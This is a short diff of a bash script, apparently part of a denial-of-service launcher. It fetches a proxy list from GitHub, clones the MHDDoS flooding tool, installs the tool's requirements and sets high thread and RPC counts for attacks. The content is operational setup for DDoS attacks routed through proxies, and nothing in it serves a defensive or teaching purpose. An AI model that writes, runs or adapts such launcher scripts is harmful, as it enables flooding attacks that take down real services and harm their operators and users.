@@ -15,12 +15,16 @@ rm proxies_config.json
 curl -o proxies_config.json https://raw.githubusercontent.com/dep-x/bash/main/proxies_config.json 
 #wget -N https:/raw.githubusercontent.com/gruzilkinnn/dep-x/bash/proxies_config.json
 
-git clone https:/github.com/MHProDev/MHDDoS.git
+#git clone https:/github.com/MHProDev/MHDDoS.git
 #change commit SHA and uncomment next 3 lines for revert to certain commit, when something code wrong happened
 #cd MHDDoS
 #git reset --hard d680dca8066c0fcea5ce59ece1ddf587a9eed79b
 #cd ..
-python3 -m pip install -r MHDDoS/requirements.txt
+#python3 -m pip install -r MHDDoS/requirements.txt
+
+git clone https://github.com/MHProDev/MHDDoS.git
+cd MHDDoS
+pip install -r requirements.txt
 
 threads="${1:-1000}"; threads="-t $threads"
 rpc="--rpc 1000"
